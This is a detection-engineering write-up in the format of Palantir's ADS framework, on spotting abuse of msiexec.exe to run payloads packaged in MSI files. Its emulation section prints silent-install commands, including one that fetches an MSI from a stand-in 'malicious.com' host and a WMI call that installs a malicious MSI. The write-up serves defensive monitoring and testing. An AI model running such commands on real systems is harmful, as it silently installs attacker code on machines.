# Palantir's Alerting & Detection Strategy (ADS) Framework: Detecting Adversarial Attempts Using Msiexec.exe

## **Goal**
The goal of this technique is to detect adversarial attempts that utilize `msiexec.exe` for executing payloads through MSI files, which may include scripts or binaries designed for malicious purposes. This method often aims to evade security detection by leveraging legitimate system processes.

## **Categorization**

- **MITRE ATT&CK Mapping:** T1218.007 - Msiexec
- **Tactic / Kill Chain Phases:** Defense Evasion
- **Platforms:** Windows
- [MITRE ATT&CK Reference](https://attack.mitre.org/techniques/T1218/007)

## **Strategy Abstract**
The detection strategy involves monitoring for unusual or suspicious use of `msiexec.exe`, a legitimate Windows tool, which could be abused to execute malicious payloads. The strategy leverages various data sources such as:

- Process monitoring logs
- Event logs (e.g., Application, System)
- Network traffic analysis

Patterns analyzed include:

- Execution of MSI files with embedded scripts or binaries.
- Msiexec.exe running remotely initiated commands.
- Use of `msiexec` for invoking DLL functions like `DllRegisterServer` and `DllUnregisterServer`.

## **Technical Context**
Adversaries exploit `msiexec.exe` to run scripts or executables that are hidden within MSI files, effectively bypassing standard security controls. This technique is often employed in sophisticated attacks to install malware silently.

### Adversary Emulation Details:
- Execution of MSI with embedded JScript or VBScript.
- Running MSI containing embedded DLLs or EXEs.
- Utilizing the `Win32_Product` WMI class to execute malicious payloads through MSI files.
- Command examples include:
  - `msiexec.exe /qn /i http://malicious.com/install.msi`
  - `wmic product call installsource "C:\path\to\malicious.msi"`

## **Blind Spots and Assumptions**
- Legitimate use of MSI files for software deployment may trigger alerts.
- Detection assumes that monitoring systems are configured to capture all relevant process executions, which might not always be the case.

## **False Positives**
Potential benign activities include:

- Standard software installations using MSI packages by IT departments.
- Routine administrative tasks involving MSI file management.
- False positives could occur during large-scale legitimate deployments of software updates or patches.

## **Priority**
**Severity: High**

Justification:
This technique is often used in advanced persistent threats (APTs) to evade detection. The ability to disguise malicious activities as legitimate system processes makes it a high-priority threat vector, necessitating robust monitoring and response strategies.

## **Validation (Adversary Emulation)**

### Steps for Emulating the Technique:

1. **Msiexec.exe - Execute Local MSI file with embedded JScript**
   - Create an MSI containing a JScript payload.
   - Use `msiexec.exe` to install it locally:  
     ```shell
     msiexec /qn /i C:\path\to\scripted.msi
     ```

2. **Msiexec.exe - Execute Local MSI file with embedded VBScript**
   - Embed a VBScript in an MSI and execute using `msiexec`.

3. **Msiexec.exe - Execute Local MSI file with an embedded DLL**
   - Package a DLL within the MSI.
   - Run it via:  
     ```shell
     msiexec /qn /i C:\path\to\dll.msi
     ```

4. **Msiexec.exe - Execute Local MSI file with an embedded EXE**
   - Embed an executable in an MSI and deploy.

5. **WMI Win32_Product Class - Execute Local MSI file with embedded JScript/VBScript/DLL/EXE**
   - Use WMI to execute MSI containing malicious scripts or binaries:
     ```shell
     wmic product call installsource "C:\path\to\malicious.msi"
     ```

6. **Msiexec.exe - Execute the DllRegisterServer function of a DLL**
   - Install an MSI that registers a DLL:  
     ```shell
     msiexec /qn /i C:\path\to\dllreg.msi
     ```

7. **Msiexec.exe - Execute Remote MSI file**
   - Deploy and execute an MSI from a remote server:
     ```shell
     msiexec /qn /i \\remote-server\share\install.msi
     ```

## **Response**
When the alert fires, analysts should:

1. Isolate affected systems to prevent further spread.
2. Verify the legitimacy of the `msiexec.exe` execution context.
3. Analyze the contents and purpose of the MSI file in question.
4. Review related logs for additional indicators of compromise (IOCs).
5. Update detection rules if needed, based on findings.

## **Additional Resources**
- Msiexec Quiet Installation
- Suspicious Msiexec Quiet Install From Remote Location
- DllUnregisterServer Function Call Via Msiexec.EXE
- Suspicious Msiexec Execute Arbitrary DLL

These resources provide further context and reference scenarios for detecting malicious uses of `msiexec.exe`.